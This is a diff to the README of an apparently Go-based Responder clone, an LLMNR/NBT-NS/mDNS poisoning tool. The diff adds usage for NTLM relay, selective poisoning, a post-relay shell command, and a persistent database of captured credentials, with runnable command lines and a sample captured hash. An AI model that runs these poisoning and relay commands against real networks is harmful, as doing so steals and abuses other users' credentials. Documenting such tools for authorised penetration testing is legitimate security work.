@@ -46,7 +46,10 @@ Captures NTLMv1/NTLMv2 hashes and cleartext credentials from LLMNR, NBT-NS, mDNS
 - NTLMv1 downgrade (`-lm`) for hashcat `-m 5500`
 - Fixed or random NTLM challenge (`-c`)
 - Analyze mode - log queries, never poison (`-A`)
-- Hash deduplication and file output
+- Selective poisoning — skip signing-required hosts (`--selective`)
+- NTLM relay to fixed targets (`--relay`, `--relay-to`)
+- **Persistent credential DB** — JSON file tracks captured accounts across runs; already-known accounts are flagged `✓ KNOWN` instead of re-captured
+- **Rich capture output** — protocol-coloured cards show account, version, hashcat mode and hash at a glance
 
 ## Installation
 
@@ -80,6 +83,7 @@ Core:
   -i <iface>        Network interface (required)
   -v                Verbose output
   -o <file>         Output file for captured hashes (default: hashes.txt)
+  -db <file>        Persistent credential DB (default: hashes.db)
   -c <hex>          Fixed 8-byte NTLM challenge (random if not set)
   -A                Analyze mode - log queries but do not poison
   -lm               Force NTLMv1 downgrade (removes EXTENDED_SESSIONSECURITY)
@@ -99,6 +103,12 @@ Disable servers:
   -no-winrm         Disable WinRM server
   -no-kerberos      Disable Kerberos server
   -no-proxy         Disable HTTP proxy
+
+Relay:
+  -relay            Enable NTLM relay mode (forward auth to target instead of capturing)
+  -relay-to <ip>    Comma-separated relay target IPs (auto-select if empty)
+  -relay-cmd <cmd>  Shell command to execute after successful relay (experimental)
+  -selective        Selective poisoning: only target hosts where SMB signing is not required
 
 WPAD:
   -wpad             Enable WPAD PAC file serving
@@ -133,10 +143,28 @@ sudo ./go-responder-linux-amd64 -i eth0 -R 10.10.10.0/24 -r 10.10.10.1
 sudo ./go-responder-linux-amd64 -i eth0 -lnkgen /tmp/triggers
 
 # SMB only (disable everything else)
-sudo ./go-responder-linux-amd64 -i eth0 -no-http -no-https -no-ftp \
-  -no-smtp -no-pop3 -no-imap -no-ldap -no-dcerpc -no-mssql \
-  -no-winrm -no-kerberos -no-proxy
+sudo ./go-responder-linux-amd64 -i eth0 -no-http -no-https -no-ftp -no-smtp -no-pop3 -no-imap -no-ldap -no-dcerpc -no-mssql -no-winrm -no-kerberos -no-proxy
+
+# NTLM relay to a fixed target (SMB signing disabled on 10.10.10.50)
+sudo ./go-responder-linux-amd64 -i eth0 --relay --relay-to 10.10.10.50 --selective
+
+# Resume a session — accounts already in hashes.db will show as KNOWN
+sudo ./go-responder-linux-amd64 -i eth0 -db hashes.db -o hashes.txt
 ```
+
+### Capture output
+
+Each credential captured is rendered as a colour-coded card:
+
+```
+────  [SMB]  ★ NEW    NTLMv2  192.168.62.11:52341
+   Account  NORTH\WINTERFELL$
+   Hashcat  -m 5600 hashes.txt
+   Hash     WINTERFELL$::NORTH:aabb...:ccdd...:eeff...
+────────────────────────────────────────────────────────────────
+```
+
+If the same account (`domain\username`) was captured in a previous run the card shows `✓ KNOWN` and the hash is not written to the text file again.  The persistent DB (default `hashes.db`) survives between runs; delete it to start fresh.
 
 ### Hash output format
 
@@ -148,6 +176,11 @@ USER::DOMAIN:CHALLENGE:NTProofStr:blob
 NTLMv1 with `-lm` (hashcat `-m 5500`):
 ```
 USER::DOMAIN:LMResponse:NTResponse:CHALLENGE
+```
+
+Kerberos PA-ENC-TIMESTAMP (hashcat `-m 19900`):
+```
+$krb5pa$23$USER$REALM$hex-encrypted-data
 ```
 
 ## Testing
